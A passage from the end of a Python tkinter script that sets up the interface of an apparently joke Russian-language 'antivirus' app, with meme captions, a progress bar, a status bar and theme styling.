    "СТССН: 'Я не вирус, я просто шалун! 😜'",
    "Недохакеры: 'Мы в шоке, но это шедевр!'",
    "СТССН: 'Самый Топовый Сам Себе Недохакер — это я!'"
]
meme_label = tk.Label(main_frame, text="", font=("Arial", 10, "italic"), fg="#facc15", bg="#1e1e2e")
meme_label.pack(side=tk.BOTTOM, anchor="se", padx=10, pady=5)

# Прогресс-бар
progress = ttk.Progressbar(main_frame, mode="determinate", length=760, style="neon.Horizontal.TProgressbar")

# Статус-бар
status_frame = tk.Frame(main_frame, bg="#2d2d3f", height=20)
status_frame.pack(fill=tk.X, side=tk.BOTTOM)
status_label = tk.Label(status_frame, text="Доктор Менгеле | Ultimate Mode | Базы обновлены: 27.03.2025", font=("Arial", 10), fg="#ffffff", bg="#2d2d3f")
status_label.pack(side=tk.LEFT, padx=5)

# Стиль для прогресс-бара
style = ttk.Style()
style.configure("neon.Horizontal.TProgressbar", troughcolor="#1e1e2e", background="#4CAF50", bordercolor="#ff4444", borderwidth=2)

# Инициализируем главную страницу
main_menu()

# Применяем светлую тему по умолчанию
change_theme()

root.mainloop()